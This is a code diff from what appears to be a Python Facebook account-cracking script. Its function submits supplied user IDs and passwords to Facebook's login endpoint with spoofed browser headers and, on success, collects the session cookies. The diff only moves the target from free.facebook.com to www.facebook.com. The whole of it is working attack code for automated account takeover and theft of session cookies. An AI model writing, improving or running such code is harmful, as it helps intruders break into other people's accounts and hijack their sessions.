@@ -716,8 +716,8 @@ def YounisXyz(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            xyzheader_fuck = {'Host':'free.facebook.com',
-     'cache-control':'max-age=0',
+            xyzheader_fuck = {'Host':'www.facebook.com',
+    'cache-control':'max-age=0',
     'dpr':'2',
     'viewport-width':'980',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
@@ -734,10 +734,10 @@ def YounisXyz(uid,pwx,tl):
     'sec-fetch-mode': 'navigate',
     'sec-fetch-user': '?1',
     'sec-fetch-dest': 'document',
-    'referer': 'https://free.facebook.com/',
+    'referer': 'https://www.facebook.com/',
     'accept-encoding': 'gzip, deflate, br',
     'accept-language': 'en-US,en;q=0.9'}
-            lo = session.post('https://free.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
+            lo = session.post('https://www.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',data=log_data,headers=xyzheader_fuck).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
